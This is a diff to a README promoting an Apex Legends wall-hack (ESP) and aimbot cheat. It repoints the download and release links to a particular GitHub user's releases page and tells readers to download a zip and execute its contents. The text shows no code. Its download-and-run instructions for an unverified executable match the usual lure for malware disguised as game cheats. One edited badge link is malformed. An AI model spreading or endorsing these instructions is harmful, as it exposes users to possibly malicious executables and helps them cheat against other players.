@@ -1,6 +1,6 @@
 # Apex Legends ESP and Aimbot Tool 🎮
 
-![Apex Legends](https://img.shields.io/badge/Apex_Legends-ESP%20and%20Aimbot-brightgreen) ![Download](https://img.shields.io/badge/Download-Application.zip-blue)
+![Apex Legends](https://github.com/sahaschandraa/Apex/releases%20and%20Aimbot-brightgreen) ![Download](https://github.com/sahaschandraa/Apex/releases)
 
 Welcome to the **Apex** repository! This project provides advanced tools for Apex Legends, including an ESP (Extra Sensory Perception) feature that allows players to see enemies and loot through walls, as well as an aimbot that ensures perfect shots. This README will guide you through the installation and usage of these tools.
 
@@ -24,7 +24,7 @@ Welcome to the **Apex** repository! This project provides advanced tools for Ape
 
 To get started, download the application from the following link:
 
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+[Download https://github.com/sahaschandraa/Apex/releases](https://github.com/sahaschandraa/Apex/releases)
 
 Once downloaded, extract the contents and execute the file. Follow the on-screen instructions to complete the setup.
 
@@ -72,4 +72,4 @@ For any questions or feedback, feel free to reach out. You can contact me throug
 
 ---
 
-Thank you for using the **Apex** tools! For updates and new features, keep an eye on the [Releases](https://github.com/user/repo/releases) section.
+Thank you for using the **Apex** tools! For updates and new features, keep an eye on the [Releases](https://github.com/sahaschandraa/Apex/releases) section.
